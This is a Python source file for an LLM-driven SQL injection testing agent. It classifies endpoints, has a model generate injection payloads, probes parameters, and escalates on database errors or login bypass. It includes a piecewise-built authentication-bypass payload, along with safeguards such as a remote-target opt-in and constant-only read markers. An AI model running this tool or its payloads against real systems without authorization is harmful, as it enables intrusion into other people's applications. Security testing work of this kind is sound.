import argparse
import json
from datetime import datetime, timezone
from pathlib import Path

from agent.config import (
    DEFAULT_MAX_PAYLOADS,
    DEFAULT_RESULTS_FILE,
    DEFAULT_TARGETS_FILE,
    DEFAULT_TIMEOUT,
    LLMConfig,
)
from agent.evidence import (
    add_marker_signal,
    has_adaptive_signal,
    response_signal,
)
from agent.llm_client import LLMClient
from agent.payloads import (
    clean_next_payload,
    clean_read_confirmation_payload,
    rejected_payload_for_prompt,
)
from agent.policy import (
    apply_suitability_policy,
    clean_endpoint_context,
    clean_suitability,
    is_identity_param,
    minimum_attempts_for_context,
    should_try_read_confirmation,
)
from agent.probe import TargetNotAllowed, probe_payload
from agent.prompts import (
    decision_prompt,
    endpoint_classification_prompt,
    next_payload_prompt,
    read_confirmation_prompt,
    suitability_prompt,
)


VALID_DECISIONS = {"escalate", "not_decidable", "stop"}


def load_targets(file_path):
    return json.loads(Path(file_path).read_text(encoding="utf-8"))


def clean_decision(decision_response):
    decision = decision_response.get("decision", "not_decidable")

    if decision not in VALID_DECISIONS:
        decision = "not_decidable"

    return {
        "decision": decision,
        "confidence": decision_response.get("confidence", 0),
        "reason": decision_response.get("reason", ""),
        "next_step": decision_response.get("next_step", ""),
    }


def should_stop_param(decision):
    return decision == "stop"


def strongest_decision(current, new_decision):
    rank = {"stop": 0, "not_decidable": 1, "escalate": 2}

    return current if rank[current] >= rank[new_decision] else new_decision


def normalize_decision_with_signal(decision, signal):
    if not signal.get("available"):
        return decision

    if (
            signal.get("sql_error")
            or signal.get("auth_bypass_like")
            or signal.get("read_marker_reflected")
    ):
        decision = dict(decision)
        decision["decision"] = "escalate"
        decision["confidence"] = max(float(decision.get("confidence") or 0), 0.9)

        if signal.get("read_marker_reflected"):
            decision["reason"] = "Probe response reflected a non-sensitive SQL read marker."
            decision["next_step"] = "Stop; constant-only in-band read confirmation is sufficient."
        elif signal.get("auth_bypass_like"):
            decision["reason"] = (
                "Baseline failed authorization/authentication, while probe succeeded."
            )
            decision["next_step"] = "Stop; authentication-bypass evidence is sufficient."
        else:
            decision["reason"] = "Probe response exposed a SQL parser/database error."
            decision["next_step"] = (
                "Use one non-destructive confirmation if useful; otherwise report."
            )

        return decision

    if not has_adaptive_signal(signal) and decision.get("decision") == "escalate":
        decision = dict(decision)
        decision["decision"] = "not_decidable"
        decision["confidence"] = min(float(decision.get("confidence") or 0), 0.5)
        decision["reason"] = (
            "Baseline and probe responses were effectively identical; "
            "there is no evidence to escalate yet."
        )
        decision["next_step"] = (
            "Try one endpoint-appropriate syntax variant if the probe budget allows; "
            "otherwise stop."
        )

    return decision


def attempts_for_prompt(attempts):
    compact = []

    for attempt in attempts:
        decision = attempt.get("llm_decision") or {}
        compact.append({
            "payload": attempt.get("payload"),
            "payload_phase": attempt.get("payload_phase", "primary_probe"),
            "response_signal": attempt.get("response_signal", {}),
            "llm_decision": {
                "decision": decision.get("decision"),
                "confidence": decision.get("confidence"),
                "reason": decision.get("reason", ""),
                "next_step": decision.get("next_step", ""),
            },
        })

    return compact


def classify_endpoint(llm, target):
    try:
        return clean_endpoint_context(
            llm.ask_json(endpoint_classification_prompt(target))
        )
    except Exception as error:
        return {
            "endpoint_type": "other_data_endpoint",
            "resource": "",
            "likely_sql_context": "unknown",
            "recommended_attack_style": "generic_read_probe",
            "avoid_payload_styles": [],
            "probe_priority": "medium",
            "confidence": 0,
            "reason": f"Endpoint classification failed: {error}",
        }


def auth_boolean_probe_value():
    quote = "'"
    operator = "OR"
    comparison_left = 1
    comparison_right = 1
    comment = "--"

    return f"{quote} {operator} {comparison_left}={comparison_right} {comment}"


def generated_auth_payload(endpoint_context, param, attempted_payloads):
    if endpoint_context.get("endpoint_type") != "auth_login":
        return None

    if endpoint_context.get("recommended_attack_style") != "auth_boolean_bypass":
        return None

    if not is_identity_param(param):
        return None

    payload_response = {
        "payload": {
            "payload": auth_boolean_probe_value(),
            "rationale": (
                "Generated generic auth boolean-bypass probe for the identity field."
            ),
            "expected_signal": "authentication status changes from rejected to accepted",
        }
    }
    payload_info, _ = clean_next_payload(
        payload_response,
        attempted_payloads,
        endpoint_context,
        param,
    )

    return payload_info


def new_target_result(target, endpoint_context):
    return {
        "method": target["method"],
        "path": target["path"],
        "url": target["url"],
        "endpoint_context": endpoint_context,
        "params": [],
    }


def new_param_result(param, endpoint_context):
    return {
        "name": param["name"],
        "in": param["in"],
        "endpoint_context": endpoint_context,
        "suitability": {},
        "payload_count": 0,
        "attempts": [],
        "final_decision": "not_decidable",
        "strongest_decision": "stop",
        "stop_reason": "",
    }


def record_attempt(param_result, phase, payload_info, baseline, probe, signal, decision):
    param_result["attempts"].append({
        "payload_phase": phase,
        "payload": payload_info["payload"],
        "payload_rationale": payload_info.get("rationale", ""),
        "expected_signal": payload_info.get("expected_signal", ""),
        "expected_marker": payload_info.get("expected_marker", ""),
        "baseline": baseline,
        "probe": probe,
        "response_signal": signal,
        "llm_decision": decision,
    })
    param_result["final_decision"] = decision["decision"]
    param_result["strongest_decision"] = strongest_decision(
        param_result["strongest_decision"],
        decision["decision"],
    )


def probe_and_decide(
        llm,
        target,
        param,
        payload_info,
        timeout,
        allow_remote_targets,
        failure_prefix="Probe",
        remote_target_is_stop=True,
        signal_transform=None
):
    try:
        baseline, probe = probe_payload(
            target,
            param,
            payload_info["payload"],
            timeout,
            allow_remote=allow_remote_targets,
        )
        signal = response_signal(baseline, probe)

        if signal_transform:
            signal = signal_transform(signal, probe, payload_info)

        decision_response = llm.ask_json(
            decision_prompt(
                target,
                param,
                baseline,
                probe,
                payload_info,
                signal,
            )
        )
        decision = clean_decision(decision_response)
        decision = normalize_decision_with_signal(decision, signal)

        return baseline, probe, signal, decision

    except TargetNotAllowed as error:
        baseline = None
        probe = None
        signal = response_signal(baseline, probe)

        if remote_target_is_stop:
            return baseline, probe, signal, {
                "decision": "stop",
                "confidence": 1,
                "reason": str(error),
                "next_step": "Use a local target or explicitly allow remote targets.",
            }

        return baseline, probe, signal, {
            "decision": "not_decidable",
            "confidence": 0,
            "reason": f"{failure_prefix} failed: {error}",
            "next_step": "Report confirmed error-based SQL injection.",
        }

    except Exception as error:
        baseline = None
        probe = None
        signal = response_signal(baseline, probe)
        next_step = (
            "Report confirmed error-based SQL injection."
            if failure_prefix.lower().startswith("read confirmation")
            else "Retry after fixing connectivity or LLM configuration."
        )

        return baseline, probe, signal, {
            "decision": "not_decidable",
            "confidence": 0,
            "reason": f"{failure_prefix} failed: {error}",
            "next_step": next_step,
        }


def run_agent(
        targets_file=DEFAULT_TARGETS_FILE,
        output_file=DEFAULT_RESULTS_FILE,
        max_payloads=DEFAULT_MAX_PAYLOADS,
        timeout=DEFAULT_TIMEOUT,
        allow_remote_targets=False,
        limit=None
):
    llm = LLMClient(LLMConfig.from_env())
    targets = load_targets(targets_file)
    results = {
        "started_at": datetime.now(timezone.utc).isoformat(),
        "targets_file": targets_file,
        "target_count": len(targets),
        "results": [],
    }

    for target in targets[:limit]:
        endpoint_context = classify_endpoint(llm, target)
        target_with_context = dict(target)
        target_with_context["endpoint_context"] = endpoint_context
        target_result = new_target_result(target, endpoint_context)

        for param in target.get("params", []):
            param_result = new_param_result(param, endpoint_context)

            try:
                suitability = clean_suitability(
                    llm.ask_json(suitability_prompt(target_with_context, param))
                )
                suitability = apply_suitability_policy(
                    target_with_context,
                    param,
                    endpoint_context,
                    suitability,
                )
                param_result["suitability"] = suitability

            except Exception as error:
                param_result["final_decision"] = "not_decidable"
                param_result["strongest_decision"] = "not_decidable"
                param_result["stop_reason"] = (
                    f"Suitability check failed before probing: {error}"
                )
                target_result["params"].append(param_result)
                continue

            if not suitability["probe"]:
                param_result["final_decision"] = "stop"
                param_result["strongest_decision"] = "stop"
                param_result["stop_reason"] = (
                    "Skipped by suitability gate: "
                    + (suitability.get("reason") or "No SQLi-relevant signal expected.")
                )
                target_result["params"].append(param_result)
                continue

            attempted_payloads = set()
            payload_generation_rejections = []

            for _ in range(max_payloads):
                payload_info = generated_auth_payload(
                    endpoint_context,
                    param,
                    attempted_payloads,
                )
                payload_error = ""
                payload_response = {}

                if not payload_info:
                    try:
                        for _ in range(3):
                            prompt_attempts = (
                                attempts_for_prompt(param_result["attempts"])
                                + payload_generation_rejections
                            )
                            payload_response = llm.ask_json(
                                next_payload_prompt(
                                    target_with_context,
                                    param,
                                    prompt_attempts,
                                    max_payloads,
                                )
                            )
                            payload_info, payload_error = clean_next_payload(
                                payload_response,
                                attempted_payloads,
                                endpoint_context,
                                param,
                            )

                            if payload_info:
                                break

                            payload_generation_rejections.append(
                                rejected_payload_for_prompt(
                                    payload_response,
                                    payload_error
                                    or payload_response.get("reason")
                                    or "Payload was not usable.",
                                )
                            )

                    except Exception as error:
                        param_result["final_decision"] = "not_decidable"
                        param_result["strongest_decision"] = "not_decidable"
                        param_result["stop_reason"] = (
                            f"LLM payload generation failed: {error}"
                        )
                        break

                if not payload_info:
                    param_result["final_decision"] = "stop"
                    param_result["stop_reason"] = (
                        payload_error
                        or payload_response.get("reason")
                        or "LLM did not provide a new useful payload."
                    )
                    break

                attempted_payloads.add(payload_info["payload"])
                param_result["payload_count"] += 1
                baseline, probe, signal, decision = probe_and_decide(
                    llm,
                    target_with_context,
                    param,
                    payload_info,
                    timeout,
                    allow_remote_targets,
                )
                record_attempt(
                    param_result,
                    "primary_probe",
                    payload_info,
                    baseline,
                    probe,
                    signal,
                    decision,
                )

                if signal.get("auth_bypass_like"):
                    param_result["stop_reason"] = (
                        "Stopped after sufficient authentication-bypass evidence."
                    )
                    break

                if (
                        signal.get("sql_error")
                        and should_try_read_confirmation(endpoint_context, param_result)
                        and param_result["payload_count"] < max_payloads
                ):
                    confirmation_info = None
                    confirmation_error = ""
                    confirmation_response = {}

                    try:
                        for _ in range(3):
                            confirmation_attempts = (
                                attempts_for_prompt(param_result["attempts"])
                                + param_result.get("confirmation_rejections", [])
                            )
                            confirmation_response = llm.ask_json(
                                read_confirmation_prompt(
                                    target_with_context,
                                    param,
                                    confirmation_attempts,
                                )
                            )
                            confirmation_info, confirmation_error = clean_read_confirmation_payload(
                                confirmation_response,
                                attempted_payloads,
                                endpoint_context,
                                param,
                            )

                            if confirmation_info:
                                break

                            param_result.setdefault("confirmation_rejections", []).append(
                                rejected_payload_for_prompt(
                                    confirmation_response,
                                    confirmation_error
                                    or confirmation_response.get("reason")
                                    or "Read confirmation payload was not usable.",
                                )
                            )

                    except Exception as error:
                        param_result.setdefault("confirmation_rejections", []).append({
                            "payload": "",
                            "response_signal": {
                                "available": False,
                                "reason": f"Read confirmation generation failed: {error}",
                            },
                            "llm_decision": {
                                "decision": "not_decidable",
                                "confidence": 0,
                                "reason": str(error),
                                "next_step": "Report confirmed error-based SQL injection.",
                            },
                        })
                        confirmation_info = None

                    if confirmation_info:
                        attempted_payloads.add(confirmation_info["payload"])
                        param_result["payload_count"] += 1
                        (
                            confirmation_baseline,
                            confirmation_probe,
                            confirmation_signal,
                            confirmation_decision,
                        ) = probe_and_decide(
                            llm,
                            target_with_context,
                            param,
                            confirmation_info,
                            timeout,
                            allow_remote_targets,
                            failure_prefix="Read confirmation probe",
                            remote_target_is_stop=False,
                            signal_transform=add_marker_signal,
                        )
                        record_attempt(
                            param_result,
                            "read_confirmation",
                            confirmation_info,
                            confirmation_baseline,
                            confirmation_probe,
                            confirmation_signal,
                            confirmation_decision,
                        )

                        if confirmation_signal.get("read_marker_reflected"):
                            param_result["stop_reason"] = (
                                "Stopped after non-sensitive in-band read confirmation."
                            )
                            break
                        else:
                            param_result.setdefault("confirmation_rejections", []).append({
                                "payload": confirmation_info["payload"],
                                "response_signal": confirmation_signal,
                                "llm_decision": confirmation_decision,
                            })

                no_signal = signal.get("available") and not has_adaptive_signal(signal)
                minimum_attempts = minimum_attempts_for_context(
                    endpoint_context,
                    suitability,
                )

                if (
                        no_signal
                        and decision["decision"] == "stop"
                        and len(param_result["attempts"]) < minimum_attempts
                ):
                    continue

                if (
                        decision["decision"] in {"not_decidable", "stop"}
                        and no_signal
                        and len(param_result["attempts"]) >= minimum_attempts
                ):
                    param_result["stop_reason"] = (
                        "Stopped because the response matched baseline closely; "
                        "there was no useful error or behavior signal to adapt from."
                    )
                    break

                if should_stop_param(decision["decision"]):
                    param_result["stop_reason"] = decision.get("reason", "")
                    break

            if param_result["strongest_decision"] != "stop":
                param_result["final_decision"] = param_result["strongest_decision"]

            if param_result["attempts"] and not param_result["stop_reason"]:
                param_result["stop_reason"] = "Max attempts reached."

            target_result["params"].append(param_result)

        results["results"].append(target_result)
        Path(output_file).write_text(
            json.dumps(results, indent=2),
            encoding="utf-8",
        )

    results["finished_at"] = datetime.now(timezone.utc).isoformat()
    Path(output_file).write_text(
        json.dumps(results, indent=2),
        encoding="utf-8",
    )

    return results


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the LLM-driven SQLi payload agent."
    )
    parser.add_argument("--targets", default=DEFAULT_TARGETS_FILE)
    parser.add_argument("--output", default=DEFAULT_RESULTS_FILE)
    parser.add_argument("--max-payloads", type=int, default=DEFAULT_MAX_PAYLOADS)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--limit", type=int)
    parser.add_argument("--allow-remote-targets", action="store_true")

    return parser.parse_args()


def main():
    args = parse_args()
    results = run_agent(
        targets_file=args.targets,
        output_file=args.output,
        max_payloads=args.max_payloads,
        timeout=args.timeout,
        allow_remote_targets=args.allow_remote_targets,
        limit=args.limit,
    )

    print("LLM agent run complete")
    print(f"Targets loaded: {results['target_count']}")
    print(f"Results written: {args.output}")


if __name__ == "__main__":
    main()
